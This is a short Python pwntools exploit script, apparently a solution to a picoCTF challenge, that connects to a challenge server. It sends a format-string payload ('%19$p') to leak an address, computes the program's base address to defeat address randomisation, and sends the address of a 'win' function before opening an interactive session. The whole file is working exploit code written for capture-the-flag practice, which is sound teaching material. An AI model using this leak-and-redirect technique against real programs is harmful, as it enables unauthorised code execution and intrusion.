from pwn import *

context.binary = elf = ELF('./vuln')

# pr = process()
pr = remote('rescued-float.picoctf.net', 61569)
pr.recvuntil(b'name:')
pr.sendline(b'%19$p')

ln = pr.recvline().strip()
ln = int(ln, 16)
elf.address = ln - elf.symbols['main'] -65
log.info(f'elf.address: {hex(elf.address)}')
pr.sendline(hex(elf.symbols['win']).encode())
pr.interactive()
#print(ln)

